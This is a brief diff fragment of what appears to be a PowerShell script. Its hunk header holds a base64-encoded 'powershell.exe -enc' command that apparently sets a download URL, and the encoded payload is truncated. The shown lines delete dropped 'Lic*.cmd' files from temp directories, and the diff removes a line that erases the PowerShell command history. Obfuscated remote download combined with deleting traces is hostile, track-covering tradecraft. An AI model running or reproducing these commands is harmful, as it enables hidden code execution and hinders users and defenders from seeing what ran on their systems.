@@ -7,4 +7,3 @@ powershell.exe -enc JABEAG8AdwBuAGwAbwBhAGQAVQBSAEwAIAA9ACAAJwBoAHQAdABwAHMAOgAv
 
 $FilePaths = @("$env:TEMP\Lic*.cmd", "$env:SystemRoot\Temp\Lic*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
-Remove-Item (Get-PSReadlineOption).HistorySavePath
